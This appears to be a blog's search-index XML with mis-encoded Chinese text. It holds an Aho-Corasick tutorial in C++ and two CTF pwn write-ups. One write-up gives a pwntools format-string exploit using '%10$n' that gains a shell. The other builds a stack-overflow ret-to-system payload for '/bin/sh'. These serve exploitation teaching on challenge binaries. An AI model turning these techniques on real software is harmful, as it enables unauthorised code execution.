<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ACè‡ªåŠ¨æœºç®—æ³•</title>
    <url>/2020/11/27/AC%E8%87%AA%E5%8A%A8%E6%9C%BA%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><code>AC</code>è‡ªåŠ¨æœºï¼Œè‹±æ–‡æ˜¯<code>Aho-Corasick automaton</code>ï¼Œè¯¥ç®—æ³•åœ¨1975å¹´äº§ç”Ÿäºè´å°”å®éªŒå®¤ï¼Œæ˜¯è‘—åçš„å¤šæ¨¡åŒ¹é…ç®—æ³•ã€‚</p>
<p>è¯¥ç®—æ³•å€ŸåŠ©<code>Trie</code>ï¼Œå³å­—å…¸æ ‘ï¼Œé…ä»¥å¤±é…æŒ‡é’ˆï¼Œåœ¨å¤šæ¨¡å¼ä¸²åŒ¹é…ä¸­æœ‰ç€æé«˜çš„æ•ˆç‡ã€‚</p>
<p>ç®—æ³•çš„ç¬¬ä¸€æ­¥æ˜¯æ ¹æ®æ‰€æœ‰çš„æ¨¡å¼ä¸²æ„å»ºä¸€é¢—å­—å…¸æ ‘ï¼Œç„¶åå°±æ˜¯æ·»åŠ å¤±é…æŒ‡é’ˆï¼Œæœ€åæ˜¯æ¨¡å¼åŒ¹é…è¿‡ç¨‹ã€‚</p>
<p>åœ¨åªæœ‰ä¸€ä¸ªæ¨¡å¼ä¸²çš„æ—¶å€™ï¼Œä¸€èˆ¬é‡‡ç”¨<code>KMP</code>ç®—æ³•ï¼Œè¯¥ç®—æ³•æ ¸å¿ƒåœ¨äº<code>next[]</code>æ•°ç»„ï¼Œè¯¥æ•°ç»„ä½œç”¨æ˜¯å½“é‡åˆ°å½“å‰å­—ç¬¦ä¸åŒ¹é…çš„æ—¶å€™ï¼Œæ¨¡å¼ä¸²è¯¥å¦‚ä½•ç§»åŠ¨ã€‚é¢å¯¹å¾ˆå¤šæ¨¡å¼ä¸²çš„æ—¶å€™ï¼Œå¦‚æœå¯¹æ¯ä¸€ä¸ªæ¨¡å¼ä¸²éƒ½é‡‡ç”¨<code>KMP</code>ç®—æ³•ï¼Œè¿™æ ·è™½ç„¶ç†è®ºä¸Šå¯è¡Œï¼Œä½†æ˜¯æ—¶é—´å¤æ‚åº¦éå¸¸ä¹‹é«˜ã€‚</p>
<p><code>AC</code>è‡ªåŠ¨æœºä¸­çš„<code>Fail</code>æŒ‡é’ˆçš„ä½œç”¨ä¹Ÿæ˜¯ç±»ä¼¼<code>next[]</code>ï¼Œä¸è¿‡è¿™ä¸ªå¤±é…æŒ‡é’ˆçš„æ„å»ºæ˜¯æ ¹æ®æ¨¡å¼ä¸²ä¹‹é—´çš„å…¬å…±åç¼€è¿›è¡Œæ„å»ºçš„ã€‚<a id="more"></a></p>
<h2 id="ç®—æ³•å®ç°"><a href="#ç®—æ³•å®ç°" class="headerlink" title="ç®—æ³•å®ç°"></a>ç®—æ³•å®ç°</h2><h3 id="é¢˜ç›®èƒŒæ™¯"><a href="#é¢˜ç›®èƒŒæ™¯" class="headerlink" title="é¢˜ç›®èƒŒæ™¯"></a>é¢˜ç›®èƒŒæ™¯</h3><p><a href="https://www.luogu.com.cn/problem/P3808" target="_blank" rel="noopener">æ´›è°·P3808 ACè‡ªåŠ¨æœºæ¨¡ç‰ˆ</a></p>
<h3 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DESC (1000001)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLE_LEN (26)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KW_LEN (51)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NODE_LEN (1000006)</span></span><br><span class="line"><span class="comment">// #define NODE_LEN (16)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROOT (0)</span></span><br><span class="line"><span class="keyword">char</span> dscri[NODE_LEN];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> child[TABLE_LEN];</span><br><span class="line">    <span class="keyword">int</span> fail;</span><br><span class="line">    <span class="keyword">char</span> name;</span><br><span class="line">    <span class="keyword">int</span> cnt;</span><br><span class="line">&#125; AC[NODE_LEN];</span><br><span class="line"><span class="keyword">int</span> nodePtr = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addFail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">queue</span>&lt;<span class="keyword">int</span>&gt; myQueue;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; TABLE_LEN; i++)</span><br><span class="line">        <span class="keyword">if</span> (AC[ROOT].child[i]) myQueue.push(AC[ROOT].child[i]);</span><br><span class="line">    <span class="keyword">while</span> (!myQueue.empty()) &#123;</span><br><span class="line">        <span class="keyword">int</span> father = myQueue.front();</span><br><span class="line">        myQueue.pop();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; TABLE_LEN; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> childId = AC[father].child[i];</span><br><span class="line">            <span class="keyword">if</span> (childId) &#123;</span><br><span class="line">                <span class="comment">// è‹¥AC[father].failèŠ‚ç‚¹æ²¡æœ‰å­èŠ‚ç‚¹i  åˆ™AC[childId].failä¸º0</span></span><br><span class="line">                <span class="comment">// å³æ ¹èŠ‚ç‚¹</span></span><br><span class="line">                AC[childId].fail = AC[AC[father].fail].child[i];</span><br><span class="line">                myQueue.push(childId);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                AC[father].child[i] = AC[AC[father].fail].child[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trieInsert</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">word</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> now = ROOT, len = <span class="built_in">strlen</span>(<span class="keyword">word</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> c = <span class="keyword">word</span>[i] - <span class="string">'a'</span>;</span><br><span class="line">        <span class="keyword">if</span> (!AC[now].child[c]) &#123;</span><br><span class="line">            AC[now].child[c] = nodePtr++;</span><br><span class="line">            AC[AC[now].child[c]].name = c + <span class="string">'a'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        now = AC[now].child[c];</span><br><span class="line">    &#125;</span><br><span class="line">    AC[now].cnt++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">acQuery</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(dscri), sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> now = ROOT;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> c = dscri[i] - <span class="string">'a'</span>;</span><br><span class="line">        now = AC[now].child[c];</span><br><span class="line">        <span class="comment">// å¾ªç¯æ±‚è§£æ˜¯å› ä¸ºfailæŒ‡å‘çš„èŠ‚ç‚¹ä¹Ÿå’Œè¯¥èŠ‚ç‚¹æœ‰ç›¸åŒéƒ¨åˆ†</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = now; j &amp;&amp; AC[j].cnt != <span class="number">-1</span>; j = AC[j].fail) &#123;</span><br><span class="line">            sum += AC[j].cnt;</span><br><span class="line">            AC[j].cnt = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> caseNum, n;</span><br><span class="line">    <span class="keyword">char</span> p[NODE_LEN];</span><br><span class="line">    <span class="built_in">memset</span>(AC, <span class="number">0</span>, <span class="keyword">sizeof</span>(AC));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>, p);</span><br><span class="line">        trieInsert(p);</span><br><span class="line">    &#125;</span><br><span class="line">    addFail();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, dscri);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, acQuery());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>c</tag>
        <tag>BFS</tag>
        <tag>ACè‡ªåŠ¨æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5é¢˜è§£</title>
    <url>/2022/08/29/BUUCTF-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>è€ƒç‚¹ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´-è¦†ç›–æŒ‡å®šåœ°å€ä¸ºå°æ•°å­—ã€‚</p>
<p>æœ¬æ–‡éœ€è¦ä½ äº†è§£å­—ç¬¦ä¸²æ¼æ´ç›¸å…³çŸ¥è¯†ï¼Œå¦‚æœå°šæœªäº†è§£ï¼Œå¯ç§»æ­¥è‡³<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/" target="_blank" rel="noopener">ã€ctf-wikiã€‘</a>å­¦ä¹ </p>
<p>ä¸‹è½½æ–‡ä»¶ä»¥åï¼ŒæŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯ï¼š<a id="more"></a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file pwn           </span></span><br><span class="line">pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6a8aa744920dda62e84d44fcc440c05f31c4c23d, stripped</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹ä¿æŠ¤ä¿¡æ¯ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">checksec --file=pwn</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols        No    0               2               pwn</span><br></pre></td></tr></table></figure>

<p><strong>Canary</strong>å‡ºç°äº†ï¼Œé‚£æ ˆæº¢å‡ºå°±ä½¿ä¸å¾—äº†ï¼Œ<strong>NX</strong>å¼€å¯æ„å‘³ç€æ ˆä¸­æ•°æ®æ²¡æœ‰æ‰§è¡Œæƒé™ï¼ŒçœŸå¯è°“é‡é‡éš¾å…³ã€‚</p>
<p>ç„¶åè¿è¡Œä¸€ä¸‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./pwn           </span></span><br><span class="line">your name:yalexin</span><br><span class="line">Hello,yalexin</span><br><span class="line">your passwd:123456</span><br><span class="line">fail</span><br><span class="line"><span class="meta">$</span><span class="bash"> ./pwn</span></span><br><span class="line">your name:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">Hello,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaï¿½your passwd:fail</span><br></pre></td></tr></table></figure>

<p>ä¹°çœ‹å‡ºå•¥ç«¯å€ªï¼Œé‚£å°±ç»§ç»­ä½¿ç”¨IDA32ä½ç¨‹åºçœ‹ä¸€ä¸‹ï¼š</p>
<p>å…³é”®ä»£ç å’Œæ³¨é‡Šå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  </span><br><span class="line">v1 = time(<span class="number">0</span>);</span><br><span class="line">srand(v1);</span><br><span class="line">fd = <span class="built_in">open</span>(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ä½¿ç”¨ç§å­ä»¥åï¼Œäº§ç”Ÿéšæœºæ•°ï¼Œå†™åˆ°unk_804C044ä¸­</span></span><br><span class="line"><span class="built_in">read</span>(fd, &amp;unk_804C044, <span class="number">4u</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"your name:"</span>);</span><br><span class="line"><span class="comment">// bufåˆ°æ ˆåº•çš„é•¿åº¦æœ‰0x70hï¼Œä½†æ˜¯æˆ‘ä»¬åªèƒ½è¾“å…¥ 0x63hï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ— æ³•åœ¨è¿™é‡Œæº¢å‡º</span></span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x63</span>u);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Hello,"</span>);</span><br><span class="line"><span class="comment">// çœ‹åˆ°äº†è¿™æ ·å­ä½¿ç”¨printfå‡½æ•°ï¼Œç«‹å³æ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼</span></span><br><span class="line"><span class="built_in">printf</span>(&amp;buf);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"your passwd:"</span>);</span><br><span class="line"><span class="comment">// åŒç†ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬ä¹Ÿæ— æ³•åœ¨è¿™é‡Œæº¢å‡º</span></span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, &amp;nptr, <span class="number">0xF</span>u);</span><br><span class="line"><span class="comment">// æˆ‘ä»¬å¯ä»¥é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æŠŠè¿™ä¸ªæ•°æ®æ³„éœ²å‡ºæ¥ï¼Œç„¶åå†è¾“å…¥è¯¥å€¼ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä¿®æ”¹è¯¥å€¼</span></span><br><span class="line"><span class="keyword">if</span> ( atoi(&amp;nptr) == unk_804C044 )&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"ok!!"</span>);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"fail"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>ç”±äºæˆ‘ä»¬çš„éšæœºæ•°å˜é‡<code>unk_804C044</code>æ˜¯å­˜å‚¨åœ¨<code>bss</code>æ®µï¼Œå¹¶ä¸åœ¨æ ˆä¸Šï¼Œæˆ‘ä»¬æ— æ³•å¾—çŸ¥è¯¥å€¼ï¼Œé‚£æˆ‘ä»¬å¯ä»¥æ¢ä¸ªæ€è·¯ï¼Œç›´æ¥ä¿®æ”¹è¯¥å˜é‡çš„å€¼ã€‚</p>
<p>åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬è¦å…ˆç¡®å®šæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²åç§»é‡ï¼Œå³ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./pwn</span></span><br><span class="line">your name:abcd%p 2:%p 3:%p 4:%p 5:%p 6:%p 7:%p 8:%p 9:%p 10:%p 11:%p</span><br><span class="line">Hello,abcd0xffa91108 2:0x63 3:(nil) 4:0xf7f55b30 5:0x3 6:0xf7f1b420 7:0x1 8:(nil) 9:0x1 10:0x64636261 11:0x32207025</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¯¥å­—ç¬¦ä¸²åœ¨<code>printf</code>å‡½æ•°ä¸­çš„ä½ç½®ç›¸è¾ƒäºç¬¬ä¸€ä¸ªå‚æ•°çš„åç§»é‡æ˜¯10ã€‚</p>
<p>é€šè¿‡IDAæˆ‘ä»¬å¯ä»¥çŸ¥é“éšæœºå˜é‡å­˜æ”¾çš„åœ°å€ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.bss:0804C044 unk_804C044     db    ? ;               ; DATA XREF: main+77â†‘o</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢æˆ‘ä»¬å°±å¯ä»¥ç€æ‰‹é€šè¿‡ä¸‹é¢çš„æ–¹å¼ä¿®æ”¹æŒ‡å®šå†…å­˜çš„å€¼äº†:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">addr%10$n</span><br></pre></td></tr></table></figure>

<p><code>%10$n</code>æ˜¯è¯´å°†å·²ç»è¾“å‡ºçš„ä¸ªæ•°å†™å…¥<code>addr</code>æ‰€æŒ‡å‘çš„åœ°å€ã€‚æˆ‘ä»¬çš„åœ°å€æ˜¯32ä½çš„ï¼Œå³4ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ­¤æ—¶å·²ç»å°†æŒ‡å®šåœ°å€ä¿®æ”¹ä¸º4äº†ã€‚</p>
<p><code>exp</code>å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">'debug'</span>, os=<span class="string">'linux'</span>, arch=<span class="string">'i386'</span>)</span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line">hacker = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    hacker = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    hacker = remote(<span class="string">''</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">random_var_addr = <span class="number">0x0804c044</span></span><br><span class="line"></span><br><span class="line">payload = p32(random_var_addr) + <span class="string">b'%10$n'</span></span><br><span class="line">hacker.sendlineafter(<span class="string">'your name:'</span>, payload)</span><br><span class="line">line = hacker.recvuntil(<span class="string">'your passwd:'</span>)</span><br><span class="line">hacker.sendline(<span class="string">b'4'</span>)</span><br><span class="line">hacker.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<p><code>pwn</code>å…¥é—¨æ˜¯çœŸçš„éš¾ï¼ï¼<del>å³ä½¿æˆ‘å·²ç»å­¦äº†ç¼–è¯‘åŸç†ã€æ±‡ç¼–å’Œç»„æˆåŸç†</del>ï¼ˆå½“ç„¶å¯èƒ½ä¹Ÿæ˜¯å› ä¸ºæ²¡å­¦å¥½ï¼‰ã€‚</p>
<p>é™¤æ­¤ä¹‹å¤–ï¼ŒIDAåç¼–è¯‘å‡ºæ¥çš„ä»£ç åªèƒ½ä½œä¸ºå‚è€ƒï¼Œåˆ‡è®°å¥‰ä¸ºåœ­è‡¬ï¼Œä¹‹å‰åˆšåˆšå­¦ä¹ çš„æ—¶å€™ï¼Œé‡åˆ°åæ±‡ç¼–å‡ºæ¥çš„ä»£ç ä¸­ï¼Œå®šä¹‰å˜é‡çš„é¡ºåºæ˜¯åçš„ï¼Œå˜é‡ç±»å‹ä¹Ÿå‡ºé”™ï¼Œæå¾—æˆ‘éƒé—·äº†å¥½å‡ å¤©ï¼Œè¿˜å¥½åŒç­çš„å¤§ä½¬æŒ‡å‡ºäº†æˆ‘çš„é”™è¯¯ã€‚</p>
]]></content>
      <categories>
        <category>ç½‘ç»œæ”»é˜²</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-jarvisoj-level2é¢˜è§£</title>
    <url>/2022/08/29/BUUCTF-jarvisoj-level2%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>è€ƒç‚¹ï¼šæ ˆæº¢å‡ºæ¼æ´ã€‚</p>
<p>æœ¬æ–‡éœ€è¦ä½ äº†è§£æ ˆæº¢å‡ºæ¼æ´ç›¸å…³çŸ¥è¯†ï¼Œå¦‚æœå°šæœªäº†è§£ï¼Œå¯ç§»æ­¥è‡³<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/" target="_blank" rel="noopener">ã€ctf-wikiã€‘</a>å­¦ä¹ </p>
<p>ä¸‹è½½æ–‡ä»¶ä»¥åï¼ŒæŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯ï¼š<a id="more"></a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file level2</span></span><br><span class="line">level2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a70b92e1fe190db1189ccad3b6ecd7bb7b4dd9c0, not stripped</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹ä¿æŠ¤ä¿¡æ¯ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> checksec --file=level2</span></span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH   Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   70 Symbols     No    0               1               level2</span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰å‘ç°<code>canary</code>ï¼Œè¯´æ˜æˆ‘ä»¬æœ‰æœºä¼šæº¢å‡ºï¼Œä¸ºä»€ä¹ˆè¯´æœ‰æœºä¼šå‘¢ï¼Ÿä¸‡ä¸€æˆ‘ä»¬éƒ½æ— æ³•åˆ©ç”¨<code>puts</code>å‡½æ•°å‘¢ï¼Œåˆæˆ–è€…è¾“å…¥é•¿åº¦è¢«é™åˆ¶äº†å‘¢ï¼Ÿ</p>
<p><code>NX</code>ä¹Ÿå¼€å¯äº†ï¼Œé‚£ç¨‹åºå°±æ— æ³•å°†æ ˆä¸Šçš„æ•°æ®ä½œä¸ºæŒ‡ä»¤æ¥è¿è¡Œã€‚</p>
<p>ç»§ç»­è¿è¡Œçœ‹çœ‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./level2</span></span><br><span class="line">Input:</span><br><span class="line">yalexin</span><br><span class="line">Hello World!</span><br><span class="line"><span class="meta">$</span><span class="bash"> ./level2</span></span><br><span class="line">Input:</span><br><span class="line">111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span><br><span class="line">zsh: segmentation fault  ./level2</span><br></pre></td></tr></table></figure>

<p>çœ‹æ¥å¯èƒ½æ˜¯æº¢å‡ºäº†ã€‚</p>
<p>ç»§ç»­ä½¿ç”¨IDA32åç¼–è¯‘çœ‹çœ‹ï¼Œ<code>main</code>å‡½æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span>&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(<span class="string">"echo 'Hello World!'"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è·Ÿè¿›å»ç¬¬ä¸€ä¸ªå‡½æ•°ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">"echo Input:"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ<code>buf</code>çš„é•¿åº¦æ˜¯<code>0x88h</code>ï¼Œæˆ‘ä»¬èƒ½å¤Ÿè¾“å…¥çš„é•¿åº¦æ˜¯<code>0x100</code>ï¼Œæ»¡è¶³æº¢å‡ºæ¡ä»¶ï¼</p>
<p>ç»§ç»­è§‚å¯Ÿï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„å‡½æ•°ï¼š</p>
<p><img src="https://cdn.yalexin.top/image-20220829233139496.png" alt="image-20220829233139496"></p>
<p>æˆ‘ä»¬èŠ±äº†2.12så‘ç°äº†ä¸€ä¸ªè°ƒç”¨äº†<code>system</code>å‡½æ•°çš„å‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥é€šè¿‡æº¢å‡ºï¼Œè®¾ç½®è¿”å›åœ°å€åˆ°è¯¥åœ°å€ï¼Œç„¶åä¼ é€’<code>/bin/sh</code>ä½œä¸ºå‚æ•°ï¼Œè·å–<code>shell</code>å³å¯ã€‚</p>
<p>ç»§ç»­çœ‹çœ‹æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„å­—ç¬¦ä¸²ï¼š</p>
<p><img src="https://cdn.yalexin.top/image-20220829233607425.png" alt="image-20220829233607425"></p>
<p>ç»§ç»­èŠ±äº†3.02så‘ç°äº†<code>/bin/sh</code>çš„åœ°å€ã€‚</p>
<p>å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ è¿™æ ·å­çš„<code>payload</code>ï¼Œä½¿å¾—æ‰§è¡Œå®Œ<code>read()</code>å‡½æ•°åï¼Œç¨‹åºç›´æ¥è·³è½¬åˆ°<code>_system()</code>å‡½æ•°ï¼Œè¿›è€Œæ‰§è¡Œ<code>system</code>å‡½æ•°ã€‚</p>
<p>æœ¬ç¨‹åºæ˜¯32ç¨‹åºï¼Œgccç¼–è¯‘çš„32ä½ç¨‹åºï¼Œéµå¾ªè¿™æ ·çš„å‡½æ•°è°ƒç”¨å‡†åˆ™ï¼š</p>
<ol>
<li>è°ƒç”¨æ–¹å°†å®å‚ä¿å­˜åˆ°æ ˆä¸­</li>
<li>è¢«è°ƒæ–¹ä½¿ç”¨æ ˆé¡¶åç§»é‡çš„æ–¹å¼è®¿é—®ä¿å­˜åˆ°æ ˆä¸­çš„å˜é‡</li>
<li>ç¨‹åºåˆšåˆšè¿›å…¥å‡½æ•°æ—¶å€™ï¼Œä¹Ÿå°±æ˜¯å°†è¦æ‰§è¡Œè¯¥å‡½æ•°çš„ç¬¬ä¸€æ¡æŒ‡ä»¤æ—¶ï¼Œæ ˆé¡¶ä¿å­˜çš„æ˜¯æ‰§è¡Œå®Œè¯¥è¢«è°ƒå‡½æ•°åçš„è¿”å›åœ°å€ï¼Œæ ˆé¡¶çš„ä¸‹é¢ï¼ˆæˆ‘ä»¬è§„å®šä¸Šé¢æ˜¯ä½åœ°å€ï¼Œä¸‹é¢æ˜¯é«˜åœ°å€ï¼‰ä¾æ¬¡ä¿å­˜ç€è¯¥è°ƒç”¨å‡½æ•°ç”¨åˆ°çš„å½¢å‚ï¼Œæ³¨æ„åˆ†åˆ«å¯¹åº”ç€ä»<strong>å³åˆ°å·¦</strong>çš„å‚æ•°</li>
</ol>
<p>é‚£ä¹ˆæœ¬é¢˜çš„<code>payload</code>å°±åº”è¯¥é•¿è¿™æ ·å­ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = padding * <span class="string">b'a'</span> + p32(<span class="number">0xffffe000</span>) + p32(system_func_addr) + p32(<span class="number">0xffffe000</span>) + p32(bin_sh_str_addr)</span><br></pre></td></tr></table></figure>

